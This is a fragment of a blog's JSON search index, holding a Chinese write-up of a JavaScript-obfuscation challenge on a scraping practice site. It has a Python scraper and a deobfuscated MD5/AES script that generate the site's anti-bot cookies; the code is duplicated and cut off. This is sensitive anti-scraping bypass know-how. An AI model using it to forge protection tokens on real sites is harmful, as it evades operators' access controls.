out&#125;","categories":[{"name":"JS对抗","slug":"JS对抗","permalink":"https://f19t.github.io.git/categories/JS%E5%AF%B9%E6%8A%97/"}],"tags":[{"name":"js","slug":"js","permalink":"https://f19t.github.io.git/tags/js/"}]},{"title":"js混淆-乱码增强-猿人学第5题","slug":"js混淆-乱码增强-猿人学第5题","date":"2023-07-13T09:17:28.000Z","updated":"2023-07-13T09:20:14.797Z","comments":true,"path":"2023/07/13/js混淆-乱码增强-猿人学第5题/","link":"","permalink":"https://f19t.github.io.git/2023/07/13/js%E6%B7%B7%E6%B7%86-%E4%B9%B1%E7%A0%81%E5%A2%9E%E5%BC%BA-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%AC%AC5%E9%A2%98/","excerpt":"js混淆-乱码增强-猿人学第5题这题有个for循环全是if-else，本来想用ast去解，发现变量值为动态的，所以采用了扣代码去解的。这题学到了无法search的变量，采用油猴去hook。","text":"js混淆-乱码增强-猿人学第5题这题有个for循环全是if-else，本来想用ast去解，发现变量值为动态的，所以采用了扣代码去解的。这题学到了无法search的变量，采用油猴去hook。 解题脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import jsonimport reimport requestsimport execjsurl=&quot;https://match.yuanrenxue.cn/match/5&quot;headers = &#123;&quot;user-agent&quot;: &quot;yuanrenxue.project&quot;&#125;s=requests.session()s.headers.update(headers)proxy=&#123;&#x27;https&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;login=&quot;https://match.yuanrenxue.cn/api/login&quot;data = &#123; &#x27;username&#x27;: &#x27;xxxx&#x27;, &#x27;password&#x27;: &#x27;xxxxx&#x27;&#125;#登录获取sessionids.post(login,data=data,proxies=proxy,verify=False)with open(&#x27;5_cookie.js&#x27;, &#x27;r&#x27;) as file: js_code = file.read()ctx = execjs.compile(js_code)result = ctx.call(&#x27;getC&#x27;)print(result)cookices=&#123;&#125;cookices[&#x27;m&#x27;]=result[&#x27;m&#x27;]cookices[&#x27;RM4hZBv0dDon443M&#x27;]=result[&#x27;RM4hZBv0dDon443M&#x27;]print(cookices)s.cookies.update(result)num=[]getdaturl=&quot;https://match.yuanrenxue.cn/api/match/5?page=&#123;i&#125;&amp;m=&#123;m&#125;&amp;f=&#123;f&#125;&quot;for i in range (1,6): # print(s.get(getdaturl.format(i),proxies=proxy,verify=False).text) data = json.loads(s.get(getdaturl.format(i=i,m=result[&#x27;urlm&#x27;],f=result[&#x27;urlf&#x27;]),proxies=proxy,verify=False).text) values = [item[&#x27;value&#x27;] for item in data[&#x27;data&#x27;]] num=num+valuesnum.sort(reverse=True)addall= sum(num[:5])print(addall) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532const CryptoJS = require(&#x27;crypto-js&#x27;);//初始化window = globalvar _0x4e96b4 = windowvar _$Tk = CryptoJS;_0x4e96b4[&#x27;_$6_&#x27;] = -389564586_0x4e96b4[&#x27;_$tT&#x27;] = -660478335//-678335_0x4e96b4[&#x27;_$Jy&#x27;] = -405537848_0x4e96b4[&#x27;_$pr&#x27;] = [];var _0x1171c8 = 0x67452301;var _0x4dae05 = -0x10325477;var _0x183a1d = -0x67452302;var _0xcfa373 = 0x10325476;var _0x30bc70 = String;function _0x2d5f5b() &#123; return new Date()[&#x27;valueOf&#x27;]();&#125;function _0x48d200(_0x4b706e, _0x3c3a85, _0x111154, _0x311f9f, _0x5439cf, _0x38cac7, _0x26bd2e) &#123; return _0xaaef84(_0x3c3a85 &amp; _0x111154 | ~_0x3c3a85 &amp; _0x311f9f, _0x4b706e, _0x3c3a85, _0x5439cf, _0x38cac7, _0x26bd2e);&#125;function _0x32032f(_0x520fdf, _0x13921d, _0x1af9d5, _0x4a2311, _0xb6d40a, _0x1d58da, _0x361df0) &#123; return _0xaaef84(_0x13921d ^ _0x1af9d5 ^ _0x4a2311, _0x520fdf, _0x13921d, _0xb6d40a, _0x1d58da, _0x361df0);&#125;function _0x4b459d(_0x8d8f2a, _0x406d34, _0x53e7d7, _0x26c827, _0xec41ea, _0x52dead, _0x3f66e7) &#123; return _0xaaef84(_0x53e7d7 ^ (_0x406d34 | ~_0x26c827), _0x8d8f2a, _0x406d34, _0xec41ea, _0x52dead, _0x3f66e7);&#125;function _0xaaef84(_0xaf3112, _0x2a165a, _0x532fb4, _0x10aa40, _0x41c4e7, _0x1cb4da) &#123; return _0x12e4a8(_0x3634fc(_0x12e4a8(_0x12e4a8(_0x2a165a, _0xaf3112), _0x12e4a8(_0x10aa40, _0x1cb4da)), _0x41c4e7), _0x532fb4);&#125;function _0x35f5f2(_0x243853) &#123; var _0x139b8b, _0xa791a1 = []; for (_0xa791a1[(_0x243853[&#x27;length&#x27;] &gt;&gt; 0x2) - 0x1] = void 0x0, _0x139b8b = 0x0; _0x139b8b &lt; _0xa791a1[&#x27;length&#x27;]; _0x139b8b += 0x1) _0xa791a1[_0x139b8b] = 0x0; var _0x41a533 = 0x8 * _0x243853[&#x27;length&#x27;]; for (_0x139b8b = 0x0; _0x139b8b &lt; _0x41a533; _0x139b8b += 0x8) _0xa791a1[_0x139b8b &gt;&gt; 0x5] |= (0xff &amp; _0x243853[&#x27;charCodeAt&#x27;](_0x139b8b / 0x8)) &lt;&lt; _0x139b8b % 0x20; return _0xa791a1;&#125;function _0x12e4a8(_0x7542c8, _0x5eada0) &#123; var _0x41f81f = (0xffff &amp; _0x7542c8) + (0xffff &amp; _0x5eada0); return (_0x7542c8 &gt;&gt; 0x10) + (_0x5eada0 &gt;&gt; 0x10) + (_0x41f81f &gt;&gt; 0x10) &lt;&lt; 0x10 | 0xffff &amp; _0x41f81f;&#125;function _0x3634fc(_0x5803ba, _0x1ce5b2) &#123; return _0x5803ba &lt;&lt; _0x1ce5b2 | _0x5803ba &gt;&gt;&gt; 0x20 - _0x1ce5b2;&#125;function _0x3180ec(_0x401705, _0x240e6a, _0x56b131, _0x5a5c20, _0x1f2a72, _0x2bfc1, _0x19741a) &#123; return _0xaaef84(_0x240e6a &amp; _0x5a5c20 | _0x56b131 &amp; ~_0x5a5c20, _0x401705, _0x240e6a, _0x1f2a72, _0x2bfc1, _0x19741a);&#125;function _0x11a7a2(_0x193f00, _0x1cfe89) &#123; _0x193f00[_0x1cfe89 &gt;&gt; 0x5] |= 0x80 &lt;&lt; _0x1cfe89 % 0x20, _0x193f00[0xe + (_0x1cfe89 + 0x40 &gt;&gt;&gt; 0x9 &lt;&lt; 0x4)] = _0x1cfe89; var _0x42fb36 = 16; var op = 27; eval(&#x27;b64pad = 1&#x27;); var _0x1badc3, _0x38ca59, _0x431764, _0x43f1b4, _0x5722c0, _0x3e0c38 = _0x1171c8, _0xdb4d2c = _0x4dae05, _0x1724c5 = _0x183a1d, _0x257ec6 = _0xcfa373; try &#123; if (_0x4e96b4[&#x27;_$6_&#x27;]) &#123; &#125; else &#123; _0x4e96b4[&#x27;_$6_&#x27;] = 0x20dc5d57f; &#125; &#125; catch (_0x15bf3f) &#123; _0x4e96b4[&#x27;_$6_&#x27;] = 0x2421603; &#125; for (_0x1badc3 = 0x0; _0x1badc3 &lt; _0x193f00[&#x27;length&#x27;]; _0x1badc3 += _0x42fb36) _0x38ca59 = _0x3e0c38, _0x431764 = _0xdb4d2c, _0x43f1b4 = _0x1724c5, _0x5722c0 = _0x257ec6, _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3], 0x7, 0x7d60c), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x1], 0xc, _0x4e96b4[&#x27;_$6_&#x27;]), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x2], 0x11, 0x242070db), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x3], 0x16, -0x3e423112), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x4], 0x7, -0xa83f051), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x5], 0xc, 0x4787c62a), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x6], 0x11, -0x57cfb9ed), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x7], 0x16, -0x2b96aff), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x8], 0x7, 0x698098d8), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x9], 0xc, -0x74bb0851), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xa], 0x11, -0xa44f), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xb], 0x16, -0x76a32842), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xc], 0x7, 0x6b901122), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xd], 0xc, -0x2678e6d), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xe], 0x11, -0x5986bc72), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xf], 0x16, 0x49b40821), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x1], 0x5, -0x9e1da9e), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x6], 0x9, -0x3fbf4cc0), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xb], 0xe, 0x265e5a51), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3], 0x14, -0x16493856), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x5], 0x5, -0x29d0efa3), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xa], 0x9, 0x2441453), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xf], 0xe, _0x4e96b4[&#x27;_$tT&#x27;]), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x4], 0x14, _0x4e96b4[&#x27;_$Jy&#x27;]), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x9], 0x5, 0x21e1cde6), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xe], 0x9, -0x3cc8aa0a), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x3], 0xe, -0xb2af279), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x8], 0x14, 0x455a14ed), _0x3e0c38 = _0x3180ec(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xd], 0x5, -0x5caa8e7b), _0x257ec6 = _0x3180ec(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x2], 0x9, -0x3105c08), _0x1724c5 = _0x3180ec(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x7], 0xe, 0x676f02d9), _0xdb4d2c = _0x3180ec(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xc], 0x14, -0x72d5b376), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x5], 0x4, -0x241282e), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x8], 0xb, -0x788e097f), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xb], 0x10, 0x6d9d6122), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xe], 0x17, -0x21ac7f4), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x1], 0x4, -0x5b4115bc * b64pad), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x4], 0xb, 0x4bdecfa9), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x7], 0x10, -0x944b4a0), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xa], 0x17, -0x41404390), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xd], 0x4, 0x289b7ec6), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3], 0xb, -0x155ed806), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x3], 0x10, -0x2b10cf7b), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x6], 0x17, 0x2d511fd9), _0x3e0c38 = _0x32032f(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x9], 0x4, -0x3d12017), _0x257ec6 = _0x32032f(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xc], 0xb, -0x1924661b), _0x1724c5 = _0x32032f(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xf], 0x10, 0x1fa27cf8), _0xdb4d2c = _0x32032f(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x2], 0x17, -0x3b53a99b), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3], 0x6, -0xbd6ddbc), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x7], 0xa, 0x432aff97), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xe], 0xf, -0x546bdc59), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x5], 0x15, -0x36c5fc7), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0xc], 0x6, 0x655b59c3), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x3], 0xa, -0x70ef89ee), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0xa], 0xf, -0x644f153), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x1], 0x15, -0x7a7ba22f), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x8], 0x6, 0x6fa87e4f), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xf], 0xa, -0x1d31920), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x6], 0xf, -0x5cfebcec), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0xd], 0x15, 0x4e0811a1), _0x3e0c38 = _0x4b459d(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x4], 0x6, -0x8ac817e), _0x257ec6 = _0x4b459d(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0xb], 0xa, -1120211379), _0x1724c5 = _0x4b459d(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x2], 0xf, 0x2ad7d2bb), _0xdb4d2c = _0x4b459d(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x9], 0x15, -0x14792c01), _0x3e0c38 = _0x12e4a8(_0x3e0c38, _0x38ca59), _0xdb4d2c = _0x12e4a8(_0xdb4d2c, _0x431764), _0x1724c5 = _0x12e4a8(_0x1724c5, _0x43f1b4), _0x257ec6 = _0x12e4a8(_0x257ec6, _0x5722c0); return [_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6];&#125;function _0x12b47d(_0x149183) &#123; var _0xabbcb3, _0x1145c3 = &#x27;&#x27;, _0x4fce58 = 0x20 * _0x149183[&#x27;length&#x27;]; for (_0xabbcb3 = 0x0; _0xabbcb3 &lt; _0x4fce58; _0xabbcb3 += 0x8) _0x1145c3 += _0x30bc70[&#x27;fromCharCode&#x27;](_0x149183[_0xabbcb3 &gt;&gt; 0x5] &gt;&gt;&gt; _0xabbcb3 % 0x20 &amp; 0xff); return _0x1145c3;&#125;function _0x499969(_0x82fe7e) &#123; var _0x5bdda4, _0x322a73, _0xd0b5cd = &#x27;0123456789abcdef&#x27;, _0x21f411 = &#x27;&#x27;; for (_0x322a73 = 0x0; _0x322a73 &lt; _0x82fe7e[&#x27;length&#x27;]; _0x322a73 += 0x1) _0x5bdda4 = _0x82fe7e[&#x27;charCodeAt&#x27;](_0x322a73), _0x21f411 += _0xd0b5cd[&#x27;charAt&#x27;](_0x5bdda4 &gt;&gt;&gt; 0x4 &amp; 0xf) + _0xd0b5cd[&#x27;charAt&#x27;](0xf &amp; _0x5bdda4); return _0x21f411;&#125;function _0x1ee7ec(_0x206333) &#123; return _0x12b47d(_0x11a7a2(_0x35f5f2(_0x206333), 0x8 * _0x206333[&#x27;length&#x27;]));&#125;function _0x2b8a17(_0x36f847) &#123; return unescape(encodeURIComponent(_0x36f847));&#125;function _0x41873d(_0x5a6962) &#123; return _0x1ee7ec(_0x2b8a17(_0x5a6962));&#125;function _0x37614a(_0x32e7c1) &#123; return _0x499969(_0x41873d(_0x32e7c1));&#125;function _0x474032(_0x233f82, _0xe2ed33, _0x3229f9) &#123; return _0x37614a(_0x233f82);&#125;function _0x12eaf3() &#123; return Date[&#x27;parse&#x27;](new Date());&#125;function _0x2d5f5b() &#123; return new Date()[&#x27;valueOf&#x27;]();&#125;// var _$Wa = _0x12eaf3()for (let i = 1; i &lt; 6; i++) &#123; var _$Wa = _0x12eaf3() if (i == 5) &#123; _$yw = _0x2d5f5b()[&#x27;toString&#x27;](); _0x4e96b4[&#x27;_$is&#x27;] = _$yw; _0x4e96b4[&#x27;_$pr&#x27;][&#x27;push&#x27;](_0x474032(_$yw)); &#125; else &#123; _0x4e96b4[&#x27;_$pr&#x27;][&#x27;push&#x27;](_0x474032(_$Wa)); &#125;&#125;m = _0x474032(_$yw)_0x4e96b4[&#x27;_$qF&#x27;] = CryptoJS[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4e96b4[&#x27;btoa&#x27;](_0x4e96b4[&#x27;_$is&#x27;])[&#x27;slice&#x27;](0x0, 0x10))// console.log(&#x27;qf&#x27;)// console.log(_0x4e96b4[&#x27;_$qF&#x27;])var _0xc77418 = function (_0x2ddba8, _0x392db0) &#123; return &#x27;_$qF&#x27;;&#125;;_$Ww = _$Tk[&#x27;enc&#x27;][&#x27;Utf8&#x27;][&#x27;parse&#x27;](_0x4e96b4[&#x27;_$pr&#x27;][&#x27;toString&#x27;]());_0x29dd83 = _$Tk[&#x27;AES&#x27;][&#x27;encrypt&#x27;](_$Ww, _0x4e96b4[_0xc77418(&#x27;0x6&#x27;, &#x27;OCbs&#x27;)], &#123; &#x27;mode&#x27;: _$Tk[&#x27;mode&#x27;][&#x27;ECB&#x27;], &#x27;padding&#x27;: _$Tk[&#x27;pad&#x27;][&#x27;Pkcs7&#x27;]&#125;)window._$ss = _0x29dd83[&#x27;toString&#x27;]();RM4hZBv0dDon443M = window._$ssconsole.log(&#x27;m=&#x27;+m)console.log(&#x27;RM4hZBv0dDon443M=&#x27;+RM4hZBv0dDon443M)$_zw=Date.parse(new Date()).toString();urlm= window._$isurlf=$_zwconsole.log(urlf)console.log(urlm)function getC()&#123; return &#123;m,RM4hZBv0dDon443M,urlm,urlf&#125;&#125;const CryptoJS = require(&#x27;crypto-js&#x27;);//初始化window = globalvar _0x4e96b4 = windowvar _$Tk = CryptoJS;_0x4e96b4[&#x27;_$6_&#x27;] = -389564586_0x4e96b4[&#x27;_$tT&#x27;] = -660478335//-678335_0x4e96b4[&#x27;_$Jy&#x27;] = -405537848// //明文// _0x4e96b4[&#x27;_$pr&#x27;]=[// &quot;1d42be16ecfa09515df7422544b99782&quot;,// &quot;e8e0750bb0ffa849b96cd427d1364197&quot;,// &quot;16667eb360ee02f62083e9584b6a8c5c&quot;,// &quot;48756619fd97611409df9e239cd221df&quot;,// &quot;47a37cd12276a4189a051ae1f5f061c8&quot;// ]_0x4e96b4[&#x27;_$pr&#x27;] = [];var _0x1171c8 = 0x67452301;var _0x4dae05 = -0x10325477;var _0x183a1d = -0x67452302;var _0xcfa373 = 0x10325476;var _0x30bc70 = String;function _0x2d5f5b() &#123; return new Date()[&#x27;valueOf&#x27;]();&#125;function _0x48d200(_0x4b706e, _0x3c3a85, _0x111154, _0x311f9f, _0x5439cf, _0x38cac7, _0x26bd2e) &#123; return _0xaaef84(_0x3c3a85 &amp; _0x111154 | ~_0x3c3a85 &amp; _0x311f9f, _0x4b706e, _0x3c3a85, _0x5439cf, _0x38cac7, _0x26bd2e);&#125;function _0x32032f(_0x520fdf, _0x13921d, _0x1af9d5, _0x4a2311, _0xb6d40a, _0x1d58da, _0x361df0) &#123; return _0xaaef84(_0x13921d ^ _0x1af9d5 ^ _0x4a2311, _0x520fdf, _0x13921d, _0xb6d40a, _0x1d58da, _0x361df0);&#125;function _0x4b459d(_0x8d8f2a, _0x406d34, _0x53e7d7, _0x26c827, _0xec41ea, _0x52dead, _0x3f66e7) &#123; return _0xaaef84(_0x53e7d7 ^ (_0x406d34 | ~_0x26c827), _0x8d8f2a, _0x406d34, _0xec41ea, _0x52dead, _0x3f66e7);&#125;function _0xaaef84(_0xaf3112, _0x2a165a, _0x532fb4, _0x10aa40, _0x41c4e7, _0x1cb4da) &#123; return _0x12e4a8(_0x3634fc(_0x12e4a8(_0x12e4a8(_0x2a165a, _0xaf3112), _0x12e4a8(_0x10aa40, _0x1cb4da)), _0x41c4e7), _0x532fb4);&#125;function _0x35f5f2(_0x243853) &#123; var _0x139b8b, _0xa791a1 = []; for (_0xa791a1[(_0x243853[&#x27;length&#x27;] &gt;&gt; 0x2) - 0x1] = void 0x0, _0x139b8b = 0x0; _0x139b8b &lt; _0xa791a1[&#x27;length&#x27;]; _0x139b8b += 0x1) _0xa791a1[_0x139b8b] = 0x0; var _0x41a533 = 0x8 * _0x243853[&#x27;length&#x27;]; for (_0x139b8b = 0x0; _0x139b8b &lt; _0x41a533; _0x139b8b += 0x8) _0xa791a1[_0x139b8b &gt;&gt; 0x5] |= (0xff &amp; _0x243853[&#x27;charCodeAt&#x27;](_0x139b8b / 0x8)) &lt;&lt; _0x139b8b % 0x20; return _0xa791a1;&#125;function _0x12e4a8(_0x7542c8, _0x5eada0) &#123; var _0x41f81f = (0xffff &amp; _0x7542c8) + (0xffff &amp; _0x5eada0); return (_0x7542c8 &gt;&gt; 0x10) + (_0x5eada0 &gt;&gt; 0x10) + (_0x41f81f &gt;&gt; 0x10) &lt;&lt; 0x10 | 0xffff &amp; _0x41f81f;&#125;function _0x3634fc(_0x5803ba, _0x1ce5b2) &#123; return _0x5803ba &lt;&lt; _0x1ce5b2 | _0x5803ba &gt;&gt;&gt; 0x20 - _0x1ce5b2;&#125;function _0x3180ec(_0x401705, _0x240e6a, _0x56b131, _0x5a5c20, _0x1f2a72, _0x2bfc1, _0x19741a) &#123; return _0xaaef84(_0x240e6a &amp; _0x5a5c20 | _0x56b131 &amp; ~_0x5a5c20, _0x401705, _0x240e6a, _0x1f2a72, _0x2bfc1, _0x19741a);&#125;function _0x11a7a2(_0x193f00, _0x1cfe89) &#123; _0x193f00[_0x1cfe89 &gt;&gt; 0x5] |= 0x80 &lt;&lt; _0x1cfe89 % 0x20, _0x193f00[0xe + (_0x1cfe89 + 0x40 &gt;&gt;&gt; 0x9 &lt;&lt; 0x4)] = _0x1cfe89; var _0x42fb36 = 16; var op = 27; eval(&#x27;b64pad = 1&#x27;); var _0x1badc3, _0x38ca59, _0x431764, _0x43f1b4, _0x5722c0, _0x3e0c38 = _0x1171c8, _0xdb4d2c = _0x4dae05, _0x1724c5 = _0x183a1d, _0x257ec6 = _0xcfa373; try &#123; if (_0x4e96b4[&#x27;_$6_&#x27;]) &#123; &#125; else &#123; _0x4e96b4[&#x27;_$6_&#x27;] = 0x20dc5d57f; &#125; &#125; catch (_0x15bf3f) &#123; _0x4e96b4[&#x27;_$6_&#x27;] = 0x2421603; &#125; for (_0x1badc3 = 0x0; _0x1badc3 &lt; _0x193f00[&#x27;length&#x27;]; _0x1badc3 += _0x42fb36) _0x38ca59 = _0x3e0c38, _0x431764 = _0xdb4d2c, _0x43f1b4 = _0x1724c5, _0x5722c0 = _0x257ec6, _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3], 0x7, 0x7d60c), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x1], 0xc, _0x4e96b4[&#x27;_$6_&#x27;]), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x2], 0x11, 0x242070db), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, _0x193f00[_0x1badc3 + 0x3], 0x16, -0x3e423112), _0x3e0c38 = _0x48d200(_0x3e0c38, _0xdb4d2c, _0x1724c5, _0x257ec6, _0x193f00[_0x1badc3 + 0x4], 0x7, -0xa83f051), _0x257ec6 = _0x48d200(_0x257ec6, _0x3e0c38, _0xdb4d2c, _0x1724c5, _0x193f00[_0x1badc3 + 0x5], 0xc, 0x4787c62a), _0x1724c5 = _0x48d200(_0x1724c5, _0x257ec6, _0x3e0c38, _0xdb4d2c, _0x193f00[_0x1badc3 + 0x6], 0x11, -0x57cfb9ed), _0xdb4d2c = _0x48d200(_0xdb4d2c, _0x1724c5, _0x257ec6, _0x3e0c38, 